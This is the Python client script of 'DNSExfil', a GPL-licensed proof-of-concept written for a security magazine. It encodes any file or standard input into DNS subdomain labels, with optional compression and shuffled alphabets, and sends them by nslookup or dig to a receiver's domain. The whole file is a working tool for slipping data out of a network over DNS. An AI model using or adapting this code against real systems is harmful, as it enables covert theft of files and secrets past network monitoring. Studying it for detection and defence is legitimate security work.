#!/usr/bin/python3
# -*- coding: utf-8 -*-
# DNSExfil - Exfiltrate data using DNS (PoC for DigitalWhisper.co.il).
# Copyright (C) 2021  Maor Gordon
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.

import argparse
import logging
import subprocess
import sys
import string
import platform

from DNSExfil import Alphabet, DomainBuilder, compression
from collections import defaultdict


def center_text(text: str, line_width: int = 60) -> str:
    padding = " " * ((line_width - len(text)) // 2)
    return f"{padding}{text}{padding}"


banner = f"""
██████╗░███╗░░██╗░██████╗███████╗██╗░░██╗███████╗██╗██╗░░░░░
██╔══██╗████╗░██║██╔════╝██╔════╝╚██╗██╔╝██╔════╝██║██║░░░░░
██║░░██║██╔██╗██║╚█████╗░█████╗░░░╚███╔╝░█████╗░░██║██║░░░░░
██║░░██║██║╚████║░╚═══██╗██╔══╝░░░██╔██╗░██╔══╝░░██║██║░░░░░
██████╔╝██║░╚███║██████╔╝███████╗██╔╝╚██╗██║░░░░░██║███████╗
╚═════╝░╚═╝░░╚══╝╚═════╝░╚══════╝╚═╝░░╚═╝╚═╝░░░░░╚═╝╚══════╝
{center_text("Send/Client")}
{center_text("Exfiltrate data using DNS (PoC for DigitalWhisper.co.il)")}
"""

ENCODING = "utf-8"
FORMATTER = logging.Formatter("\r[%(levelname)s] %(message)s", "%H:%M:%S")
LOGGER = logging.getLogger()
HANDLER = logging.StreamHandler(sys.stdout)
HANDLER.setLevel(logging.DEBUG)
HANDLER.setFormatter(FORMATTER)
LOGGER.addHandler(HANDLER)

CASE_SENSITIVE: Alphabet = Alphabet(b'abcdefghijklmnopqrstuvwxyz1234567890')
CASE_INSENSITIVE: Alphabet = Alphabet(b'abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHJKLMNPQRSTUVWXYZ')
HUMAN_READABLE: Alphabet = Alphabet(b'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz1234567890')
RFC4648: Alphabet = Alphabet(b'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789')
BASE58_BITCOIN: Alphabet = Alphabet(b'123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz')
BASE58_RIPPLE: Alphabet = Alphabet(b'rpshnaf39wBUDNEGHJKLM4PQRST7VWXYZ2bcdeCg65jkm8oFqi1tuvAxyz')

presets = {
    "CASE_SENSITIVE": CASE_SENSITIVE,
    "CASE_INSENSITIVE": CASE_INSENSITIVE,
    "HUMAN_READABLE": HUMAN_READABLE,
    "RFC4648": RFC4648,
    "BASE58_BITCOIN": BASE58_BITCOIN,
    "BASE58_RIPPLE": BASE58_RIPPLE,
    "default": CASE_SENSITIVE
}


# ----- Handle Send Functionality -----
def send_win(domain, mute_warnings: bool = False):
    # From Python Docs: "The only time you need to specify shell=True on Windows is when the command you wish to
    # execute is built into the shell (e.g. dir or copy)."
    proc = subprocess.run(["C:\\Windows\\System32\\nslookup.exe", domain],
                   stdout=subprocess.PIPE, stderr=(subprocess.PIPE if mute_warnings else sys.stdout), shell=True)
    return proc.stdout


def send_linux(domain, mute_warnings: bool = False):
    subprocess.run(["dig", domain],
                   stdout=subprocess.PIPE, stderr=(subprocess.PIPE if mute_warnings else sys.stdout), shell=False)


send_funcs = defaultdict(lambda _: send_linux)
send_funcs["Windows"] = send_win
send_funcs["Linux"] = send_linux  # Because...

send = send_funcs[platform.system()]

# ----- Compression Functionality -----
compressions = {getattr(i, '__id__').lower(): i for i in compression.Compression.__subclasses__()}

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description=banner, formatter_class=argparse.RawTextHelpFormatter)

    parser.add_argument(
        'file', metavar='INPUT_FILE_OR_STREAM', nargs='?', type=argparse.FileType('r'), default=sys.stdin,
        help="input filename or standard input")

    parser.add_argument(
        '-s', '--send', required=False, action="store_true",
        help='if set, sends the data using nslookup (Win) or dig (Linux)')

    parser.add_argument(
        'subdomain', metavar='SUBDOMAIN', type=str,
        help='the subdomain that receives the information')

    group = parser.add_argument_group('Alphabet Settings', description="Change Encoding Settings")

    alphabet_input_group = group.add_mutually_exclusive_group(required=False)

    alphabet_input_group.add_argument(
        '--alphabet_preset', choices=presets.keys(), default="default", required=False,
        help='select from a pre-made set of encodings')

    alphabet_input_group.add_argument(
        '-c', '--chars', type=str, required=False, metavar=string.ascii_uppercase[:10],
        help='specify characters for the encoding')

    alphabet_input_group.add_argument(
        '-r', '--range', type=str, required=False, metavar="A-Za-z",
        help='specify range of ASCII characters for the encoding')

    group.add_argument(
        '-rnd', '--randomize', required=False, action='store_true', help='Randomize the order of the characters'
                                                                         ' (recommended to use with -rs)')

    group.add_argument(
        '-seed', '--random_seed', required=False, type=int, help='Random seed used (does nothing without -r)')

    parser.add_argument(
        '-v', '--verbose', required=False, action='store_true', help='Show Debug Data')

    group_domain = parser.add_argument_group('Domain Builder Settings')
    group_domain.add_argument(
        '--compress', choices=compressions.keys(), type=str.lower, default=None, required=False,
        help='select from a selected set of compressions')

    args = parser.parse_args()

    LOGGER.setLevel(logging.DEBUG if args.verbose else logging.INFO) # Set Verbose Level
    LOGGER.debug(f"Args: {args}")

    subdomain = args.subdomain
    LOGGER.debug(f"Subdomain: {subdomain}")

    data: bytes = args.file.buffer.read()  # read file/stdin contents
    data = data.rstrip(b'\n').rstrip(b'\r')  # stdin cleanup

    if args.randomize:
        LOGGER.debug(f"Random: True | Random Seed: {args.random_seed}")
        if args.random_seed is None:
            LOGGER.warning("Randomize flag is set without a random seed. Either set a random seed or find some other"
                           " way for the receiving computer to get the shuffled alphabet.")

    #Create Alphabet Object
    rand_kwargs = dict(random_order=args.randomize, random_seed=args.random_seed) if args.randomize else dict()
    if args.chars is not None:
        alph = Alphabet(args.chars, **rand_kwargs)
    elif args.range is not None:
        alph = Alphabet.from_range(args.range, **rand_kwargs)
    else:
        alph = Alphabet(presets[args.alphabet_preset].chars, **rand_kwargs)

    LOGGER.debug(f"Alphabet: {str(alph)}")

    compress_class = compressions.get(args.compress, None)
    LOGGER.debug(f"Compression: {compress_class}")

    builder = DomainBuilder(alph, subdomain, compression=compress_class)

    builder.add(data)
    LOGGER.debug(f"Current Data Buffer: {builder.data}")

    if args.send:
        LOGGER.debug(f"Send Function: {send} | Platform: {platform.system()}")

    for domain in builder.build_domains():
        print(domain)
        if args.send:
            result = send(domain)
            LOGGER.debug(result)
